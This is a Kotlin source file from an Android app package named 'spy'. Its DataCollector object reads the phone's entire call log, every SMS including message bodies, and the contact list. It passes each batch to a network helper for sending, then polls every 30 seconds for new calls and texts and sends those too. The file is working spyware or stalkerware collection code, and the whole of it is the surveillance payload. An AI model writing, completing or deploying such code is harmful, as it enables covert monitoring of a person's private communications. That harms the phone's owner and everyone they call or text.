package com.gauravhanna.spy

import android.content.Context
import android.content.SharedPreferences
import android.database.Cursor
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

object DataCollector {
    private const val TAG = "DataCollector"
    private val executor = Executors.newSingleThreadScheduledExecutor()
    private var initialRunDone = false

    private fun getLastCallTimestamp(prefs: SharedPreferences): Long = prefs.getLong("last_call_timestamp", 0L)
    private fun setLastCallTimestamp(prefs: SharedPreferences, value: Long) = prefs.edit().putLong("last_call_timestamp", value).apply()
    private fun getLastSmsTimestamp(prefs: SharedPreferences): Long = prefs.getLong("last_sms_timestamp", 0L)
    private fun setLastSmsTimestamp(prefs: SharedPreferences, value: Long) = prefs.edit().putLong("last_sms_timestamp", value).apply()

    fun start(context: Context) {
        Log.d(TAG, "DataCollector start()")
        val prefs = context.getSharedPreferences("spy_prefs", Context.MODE_PRIVATE)
        if (!initialRunDone) {
            collectAllCalls(context, prefs)
            collectAllSms(context, prefs)
            collectAllContacts(context)
            initialRunDone = true
        }
        executor.scheduleAtFixedRate({
            collectNewCalls(context, prefs)
            collectNewSms(context, prefs)
        }, 0, 30, TimeUnit.SECONDS)
    }

    private fun collectAllCalls(context: Context, prefs: SharedPreferences) {
        val cursor = context.contentResolver.query(CallLog.Calls.CONTENT_URI, null, null, null, "${CallLog.Calls.DATE} ASC") ?: return
        try {
            val numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER)
            val nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME)
            val typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE)
            val durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION)
            val dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE)
            val calls = mutableListOf<CallLogEntry>()
            var maxDate = getLastCallTimestamp(prefs)
            while (cursor.moveToNext()) {
                val number = if (numberIdx >= 0) cursor.getString(numberIdx) ?: "" else ""
                val name = if (nameIdx >= 0) cursor.getString(nameIdx) else null
                val type = when {
                    typeIdx >= 0 -> when (cursor.getInt(typeIdx)) {
                        CallLog.Calls.INCOMING_TYPE -> "incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        else -> "missed"
                    }
                    else -> "unknown"
                }
                val duration = if (durationIdx >= 0) cursor.getInt(durationIdx) else 0
                val date = if (dateIdx >= 0) cursor.getLong(dateIdx) else 0L
                calls.add(CallLogEntry(number, name, type, duration, date))
                if (date > maxDate) maxDate = date
            }
            if (calls.isNotEmpty()) {
                Log.d(TAG, "Sending ${calls.size} existing calls")
                NetworkHelper.sendCalls(context, calls)
                setLastCallTimestamp(prefs, maxDate)
            }
        } catch (e: Exception) { Log.e(TAG, "collectAllCalls error: ${e.message}") } finally { cursor.close() }
    }

    private fun collectAllSms(context: Context, prefs: SharedPreferences) {
        val cursor = context.contentResolver.query(Telephony.Sms.CONTENT_URI, null, null, null, "${Telephony.Sms.DATE} ASC") ?: return
        try {
            val addressIdx = cursor.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyIdx = cursor.getColumnIndex(Telephony.Sms.BODY)
            val dateIdx = cursor.getColumnIndex(Telephony.Sms.DATE)
            val smsList = mutableListOf<SmsEntry>()
            var maxDate = getLastSmsTimestamp(prefs)
            while (cursor.moveToNext()) {
                val address = if (addressIdx >= 0) cursor.getString(addressIdx) ?: "" else ""
                val body = if (bodyIdx >= 0) cursor.getString(bodyIdx) ?: "" else ""
                val date = if (dateIdx >= 0) cursor.getLong(dateIdx) else 0L
                smsList.add(SmsEntry(address, body, date))
                if (date > maxDate) maxDate = date
            }
            if (smsList.isNotEmpty()) {
                Log.d(TAG, "Sending ${smsList.size} existing SMS")
                NetworkHelper.sendSMS(context, smsList)
                setLastSmsTimestamp(prefs, maxDate)
            }
        } catch (e: Exception) { Log.e(TAG, "collectAllSms error: ${e.message}") } finally { cursor.close() }
    }

    private fun collectAllContacts(context: Context) {
        val cursor = context.contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null) ?: return
        try {
            val idIdx = cursor.getColumnIndex(ContactsContract.Contacts._ID)
            val nameIdx = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)
            val contacts = mutableListOf<ContactEntry>()
            while (cursor.moveToNext()) {
                val id = cursor.getString(idIdx)
                val name = if (nameIdx >= 0) cursor.getString(nameIdx) ?: "" else ""
                var number = ""
                val phoneCursor = context.contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?", arrayOf(id), null)
                phoneCursor?.use {
                    if (it.moveToFirst()) {
                        val numberIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                        if (numberIdx >= 0) number = it.getString(numberIdx) ?: ""
                    }
                }
                contacts.add(ContactEntry(name, number))
            }
            if (contacts.isNotEmpty()) {
                Log.d(TAG, "Sending ${contacts.size} contacts")
                NetworkHelper.sendContacts(context, contacts)
            }
        } catch (e: Exception) { Log.e(TAG, "collectAllContacts error: ${e.message}") } finally { cursor.close() }
    }

    private fun collectNewCalls(context: Context, prefs: SharedPreferences) {
        val last = getLastCallTimestamp(prefs)
        val cursor = context.contentResolver.query(CallLog.Calls.CONTENT_URI, null, "${CallLog.Calls.DATE} > ?", arrayOf(last.toString()), "${CallLog.Calls.DATE} ASC") ?: return
        try {
            val numberIdx = cursor.getColumnIndex(CallLog.Calls.NUMBER)
            val nameIdx = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME)
            val typeIdx = cursor.getColumnIndex(CallLog.Calls.TYPE)
            val durationIdx = cursor.getColumnIndex(CallLog.Calls.DURATION)
            val dateIdx = cursor.getColumnIndex(CallLog.Calls.DATE)
            val calls = mutableListOf<CallLogEntry>()
            var maxDate = last
            while (cursor.moveToNext()) {
                val number = if (numberIdx >= 0) cursor.getString(numberIdx) ?: "" else ""
                val name = if (nameIdx >= 0) cursor.getString(nameIdx) else null
                val type = when {
                    typeIdx >= 0 -> when (cursor.getInt(typeIdx)) {
                        CallLog.Calls.INCOMING_TYPE -> "incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        else -> "missed"
                    }
                    else -> "unknown"
                }
                val duration = if (durationIdx >= 0) cursor.getInt(durationIdx) else 0
                val date = if (dateIdx >= 0) cursor.getLong(dateIdx) else 0L
                calls.add(CallLogEntry(number, name, type, duration, date))
                if (date > maxDate) maxDate = date
            }
            if (calls.isNotEmpty()) {
                Log.d(TAG, "Sending ${calls.size} new calls")
                NetworkHelper.sendCalls(context, calls)
                setLastCallTimestamp(prefs, maxDate)
            } else {
                Log.d(TAG, "No new calls")
            }
        } catch (e: Exception) { Log.e(TAG, "collectNewCalls error: ${e.message}") } finally { cursor.close() }
    }

    private fun collectNewSms(context: Context, prefs: SharedPreferences) {
        val last = getLastSmsTimestamp(prefs)
        val cursor = context.contentResolver.query(Telephony.Sms.CONTENT_URI, null, "${Telephony.Sms.DATE} > ?", arrayOf(last.toString()), "${Telephony.Sms.DATE} ASC") ?: return
        try {
            val addressIdx = cursor.getColumnIndex(Telephony.Sms.ADDRESS)
            val bodyIdx = cursor.getColumnIndex(Telephony.Sms.BODY)
            val dateIdx = cursor.getColumnIndex(Telephony.Sms.DATE)
            val smsList = mutableListOf<SmsEntry>()
            var maxDate = last
            while (cursor.moveToNext()) {
                val address = if (addressIdx >= 0) cursor.getString(addressIdx) ?: "" else ""
                val body = if (bodyIdx >= 0) cursor.getString(bodyIdx) ?: "" else ""
                val date = if (dateIdx >= 0) cursor.getLong(dateIdx) else 0L
                smsList.add(SmsEntry(address, body, date))
                if (date > maxDate) maxDate = date
            }
            if (smsList.isNotEmpty()) {
                Log.d(TAG, "Sending ${smsList.size} new SMS")
                NetworkHelper.sendSMS(context, smsList)
                setLastSmsTimestamp(prefs, maxDate)
            } else {
                Log.d(TAG, "No new SMS")
            }
        } catch (e: Exception) { Log.e(TAG, "collectNewSms error: ${e.message}") } finally { cursor.close() }
    }

    data class CallLogEntry(val number: String, val name: String?, val type: String, val duration: Int, val date: Long)
    data class SmsEntry(val address: String, val body: String, val date: Long)
    data class ContactEntry(val name: String, val number: String)
}